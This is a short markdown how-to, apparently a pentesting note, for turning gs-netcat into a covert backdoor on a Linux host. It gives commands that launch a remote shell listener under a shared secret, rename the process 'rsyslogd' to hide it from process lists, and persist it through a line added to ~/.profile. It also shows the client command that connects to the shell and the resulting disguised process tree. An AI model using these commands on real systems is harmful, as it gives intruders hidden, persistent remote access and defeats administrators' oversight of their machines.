# gs-netcat

### Overview

The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.

More on [https://www.gsocket.io](https://www.gsocket.io).

### Non Persistent backdoor

```
$(GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /path/to/gs-netcat")
```

### Client Connection

```
gs-netcat -i -s MySecret
```

* Above will spawn a full pty giving you the option to tab complete and use up arrow as long as CTRL+C

### Persisting the Server

The following line in the user's \~/.profile starts the backdoor (once) when the user logs in. All in one line:

The '( )' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list.

```
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a rsyslogd /path/to/gs-netcat)
```

* Ensure there are no syntax errors or the next time a user logs in they will see this message&#x20;

```
ssh root@ubuntu.space
root@ubuntu.space's password: 
Last login: Mon Dec 30 19:29:55 2024 from 192.168.15.172
-bash: /root/.profile: line 11: syntax error: unexpected end of file
```

* when you are connected to the backdoor this is how your process will look&#x20;

```
1 S root         442       1  0  80   0 -   794 do_wai 19:43 ?        00:00:00 rsyslogd
1 S root         443     442  0  80   0 -   829 do_sel 19:43 ?        00:00:00  \_ rsyslogd
0 S root         528     443  0  80   0 -  2105 do_sel 19:47 pts/4    00:00:00      \_ -bash
```

* above will occur no matter how you connect to the server

```
gs-netcat -s MySecret
gs-netcat -s -i MySecret
```
